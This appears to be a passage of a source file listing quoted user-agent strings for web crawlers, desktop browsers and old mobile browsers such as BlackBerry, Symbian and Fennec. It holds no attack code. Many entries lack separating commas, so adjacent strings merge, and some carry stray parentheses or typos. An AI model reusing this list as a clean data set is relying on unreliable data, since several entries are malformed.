"Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
"Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0;  http://www.beslist.nl/)",
"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
"zspider/0.9-dev http://feedback.redkolibri.com/",
"Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )",
"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)",
"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)",
"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)",
"TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)",
"TheSuBot/0.2 (www.thesubot.de)",
"FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"Mozilla/4.0 (compatible: FDSE robot)",
"findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable)",
"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable)",
"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2)",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3)",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2)",
"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)",
"MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)",
"Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0)",
"Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)",
"msnbot/1.0 (+http://search.msn.com/msnbot.htm)",
"msnbot/0.9 (+http://search.msn.com/msnbot.htm)",
"msnbot/0.11 ( http://search.msn.com/msnbot.htm)",
"MSNBOT/0.1 (http://search.msn.com/msnbot.htm)",
"Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)",
"Mozilla/5.0 (compatible; mxbot/1.0;  http://www.chainn.com/mxbot.html)",
"NetResearchServer/4.0(loopimprovements.com/robot.html)",
"NetResearchServer/3.5(loopimprovements.com/robot.html)",
"NetResearchServer/2.8(loopimprovements.com/robot.html)",
"NetResearchServer/2.7(loopimprovements.com/robot.html)",
"NetResearchServer/2.5(loopimprovements.com/robot.html)",
"Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)",
"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET) ",
"Googlebot/2.1 (http://www.googlebot.com/bot.html)",
"Opera/9.20 (Windows NT 6.0; U; en)",
"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16)",
"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", 
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7) "
"AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
"AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1) "
"Gecko/20100101 Firefox/5.0.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) "
"AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
"Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en) "
"Presto/2.9.168 Version/11.50",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)"
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
"Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)""magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)""Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.7.4 (Fedora015; U; AMD_PhenX6 Linux Kernal 2.6.35.2; en-UK) DevKit/534.7 (Gecko) Chrome/7.0.517.44 GoogleR/9.47.1[BlackPanda]",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; zh-TW) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; zh-TW) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.246 Mobile Safari/534.1+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; tr) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.246 Mobile Safari/534.1+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; it) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.668 Mobile Safari/534.8+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; fr) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.246 Mobile Safari/534.1+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.701 Mobile Safari/534.8+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.466 Mobile Safari/534.8+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.450 Mobile Safari/534.8+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+" "Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.446 Mobile Safari/534.8+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.201 Mobile Safari/534.1+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.1+ (KHTML, like Gecko)"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-GB) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+"
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9700; pt) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.546 Mobile Safari/534.8+",
"Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
"Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
"Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9"
"Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari"
"Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile"
"Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/4.0 (compatible; MSIE 6.0; Windows 95; PalmSource; Blazer 3.0) 16; 160x160"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; BOLT/2.340) AppleWebKit/530+ (KHTML, like Gecko) Version/4.0 Safari/530.17 UNTRUSTED/1.0 3gpp-gba"
"SamsungI8910/SymbianOS/9.1 Series60/3.0"
"NokiaN97i/SymbianOS/9.1 Series60/3.0"
"NokiaE52-1/SymbianOS/9.1 Series60/3.0 3gpp-gba"
"NokiaE5-00/SymbianOS/9.1 Series60/3.0 3gpp-gba"
"NokiaC7-00/SymbianOS/9.1 Series60/3.0 3gpp-gba"
"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC6-00/20.0.042; Profile/MIDP-2.1 Configuration/CLDC-1.1; zh-hk) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.2.6.9 3gpp-gba"
"Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"
"NokiaC6-00/10.0.021 (SymbianOS/9.4; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebkit/525 (KHTML, like Gecko) BrowserNG/7.2.6 UNTRUSTED/1.0 3gpp-gba"
"NokiaN97/21.1.107 (SymbianOS/9.4; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebkit/525 (KHTML, like Gecko) BrowserNG/7.1.4"
"NokiaC5-00/061.005 (SymbianOS/9.3; U; Series60/3.2 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525 3gpp-gba"
"Nokia5250/11.0.008 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Safari/525 3gpp-gba"
"Nokia5250/10.0.011 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Safari/525 3gpp-gba"
"Doris/1.15 [en] (Symbian)"
"Mozilla/5.0 (Windows; U; Windows CE; Mobile; like iPhone; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3 Dorothy"
"Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3 Dorothy"
"Mozilla/5.0 (Windows; U; Mobile; Dorothy Browser; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/533.3"
"Mozilla/5.0 (Windows; U; Dorothy Browser; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3"
"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0"
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1 Fennec/7.0a1"
"Mozilla/5.0 (Maemo; Linux armv7l; rv:6.0a1) Gecko/20110526 Firefox/6.0a1 Fennec/6.0a1"
"Mozilla/5.0 (Maemo; Linux armv7l; rv:6.0a1) Gecko/20110522 Firefox/6.0a1 Fennec/6.0a1"
"Mozilla/5.0 (Maemo; Linux armv7l; rv:6.0a1) Gecko/20110518 Firefox/6.0a1 Fennec/6.0a1"
"Mozilla/5.0 (Maemo; Linux armv7l; rv:6.0a1) Gecko/20110510 Firefox/6.0a1 Fennec/6.0a1"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.18) Gecko/20110614 Mozilla/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110615 Firefox/5.0 Fennec/5.0"
"Mozilla/5.0 (Maemo; Linux armv7l; rv:5.0) Gecko/20110615 Firefox/5.0 Fennec/5.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0"
"Mozilla/5.0 (Android; WOW64; Linux armv7l;rv:5.0) Gecko/20110603 Firefox/5.0 Fennec/5.0"
"Mozilla/5.0 (Android; Linux armv7l;rv:5.0) Gecko/20110603 Firefox/5.0 Fennec/5.0"
"Mozilla/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110615 Firefox/5.0 Fennec/5.0"
"Mozilla/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110614 Firefox/5.0 Fennec/5.0"
"Mozilla/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0"
"Mozilla/5.0 (Android; Linux armv71; rv:5.0) Gecko/20110615 Fennec/5.0"
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.2a1pre) Gecko/20110331 Firefox/4.2a1pre Fennec/4.1a1pre"
"Mozilla/5.0 (Android; Linux armv7l; rv:2.2a1pre) Gecko/20110403 Firefox/4.2a1pre Fennec/4.1a1pre"
"Mozilla/5.0 (Android; Linux armv7l; rv:2.2a1pre) Gecko/20110402 Firefox/4.2a1pre Fennec/4.1a1pre"
"Mozilla/5.0 (Maemo; Linux armv7l; rv:2.0b13pre) Gecko/20110315 Firefox/4.0b13pre Fennec/4.0b6pre"
"Mozilla/5.0 (Maemo; Linux armv7l; rv:2.0b8pre) Gecko/20110328 Firefox/4.0b8pre Fennec/4.0b3pre"
"Mozilla/5.0 (X11; Linux x86_64; rv:2.0) Gecko/20110402 Firefox/4.0 Fennec/4.0b3"
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b8) Gecko/20101221 Firefox/4.0b8 Fennec/4.0b3"
"Mozilla/5.0 (X11; Linux i686; rv:2.0b7pre) Gecko/20101103 Firefox/4.0b8pre Fennec/4.0b2"
"Mozilla/5.0 (X11; Linux i686; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1"
"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1"
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1"
"Mozilla/5.0 (Windows NT 6.1; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1"
"Mozilla/5.0 (Windows NT 6.0; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1"
"Mozilla/5.0 (Windows NT 5.1; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1"
"Mozilla/5.0 (Linux; U; Android 2.2; en-us; T-Mobile HTC_G2 Build/FRF91) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1"
"Mozilla/5.0 (Android; Linux armv7l; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1"
"Mozilla/5.0 (Android; Linux armv7l; rv:2.1.1) Gecko/20110415 Fennec/4.0.1"
"Mozilla/5.0 (Android; Linux arm7l; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1"
"Mozilla/5.0 (Android; Linux arm71; rv:2.1.1) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1"
"Mozilla/5.0 (X11; Linux i686; rv:2.1) Gecko/20110318 Firefox/4.0b13pre Fennec/4.0"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.13) Gecko/20101203 Mozilla/5.O(Android;Linux armv7l;rv:2.1) Gecko/20110318 Firefox/4.0b13pre Fennec/4.0 ( .NET CLR 3.5.30729)"
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.1) Gecko/20110318 Firefox/4.0b13pre Fennec/4.0"
"Mozilla/5.0 (Windows NT 5.1; rv:2.1) Gecko/20110318 Firefox/4.0b13pre Fennec/4.0"
"Mozilla/5.0 (Maemo; Linux armv7l; rv:2.1) Gecko/20110318 Firefox/4.0b13pre Fennec/4.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.1) Gecko/20110318 Firefox/4.0b13pre Fennec/4.0"
"Mozilla/5.0 (Linux arm) Gecko/20110318 Firefox/4.0b13pre Fennec/4.0"
"Mozilla/5.0 (Android; Linux armv7l; rv:2.1) Gecko/20110318 Firefox/4.0b13pre Fennec/4.0"
"Mozilla/5.0 (Android; Linux armv7l; rv:2.0) Gecko/20110103 Firefox/4.0 Fennec/4.0"
"Mozilla/5.0 (Android; Linux armv71; rv:2.1) Gecko/20110318 Firefox/4.0b13pre Fennec/4.0"
"Mozilla/5.0 (Android) Gecko/20110318 Firefox/4.0 Fennec/4.0"
"Mozilla/5.0 (Android) Gecko Firefox Fennec/4.0"
"Mozilla/5.0 (Windows NT 5.1; rv:2.0b6pre) Gecko/20100902 Firefox/4.0b6pre Fennec/2.0b1pre"
"Mozilla/5.0 (X11; Linux armv7l; rv:2.0b4pre) Gecko/20100818 Firefox/4.0b4pre Fennec/2.0a1pre"
"Mozilla/5.0 (X11; Linux armv7l; rv:2.0b4pre) Gecko/20100812 Firefox/4.0b4pre Fennec/2.0a1pre"
"Mozilla/5.0 (X11; Linux armv7l; rv:2.0b3pre) Gecko/20100730 Firefox/4.0b3pre Fennec/2.0a1pre"
"Mozilla/5.0 (X11; Linux armv71; en-US; rv:2.0b2pre) Gecko/20100722 Firefox/4.0b2pre Fennec/2.0a1pre"
"Mozilla/5.0 (X11; Linux armv71; rv:2.0b4pre) Gecko/20100818 Firefox/4.0b4pre Fennec/2.0a1pre"
"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Fennec/2.0.1"
"Mozilla/5.0 (X11; U; Linux armv7l; pl-PL; rv:1.9.2.5) Gecko/20100614 Firefox/3.6.5pre Fennec/1.1"
"Mozilla/5.0 (X11; U; Linux armv7l; en-US; rv:1.9.2a1pre) Gecko/20090322 Fennec/1.0b2pre"
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1.17) Gecko/20080829 Mozilla/5.0 (X11; U; Linux armv7l; en-US; rv:1.9.2a1pre) Gecko/20090322 Fennec/1.0b2pre"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.2a1pre) Gecko/20090626 Fennec/1.0b2"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2a1pre) Gecko/20090317 Fennec/1.0b1"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2a1pre) Gecko/20090317 Fennec/1.0b1"
"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1b2pre) Gecko/20081116 Fennec/1.0a2pre"
"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081116 Fennec/1.0a2pre"
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2a1pre) Gecko/20081222 Fennec/1.0a2"
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1b4pre) Gecko/20090401 Fennec/1.0a2"
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1b3pre) Gecko/20090106 Fennec/1.0a2"
"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.2a1pre) Gecko/20081222 Fennec/1.0a2"
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2a1pre) Gecko/20081222 Fennec/1.0a2"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2a1pre) Gecko/20081222 Fennec/1.0a2"
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1"
"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1"
"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1"
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1"
"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1b1pre) Gecko/20081005220218 Gecko/2008052201 Fennec/0.9pre"
"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1b1pre) Gecko/20080923171103 Fennec/0.8"
"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1a2pre) Gecko/20080820121708 Fennec/0.7"
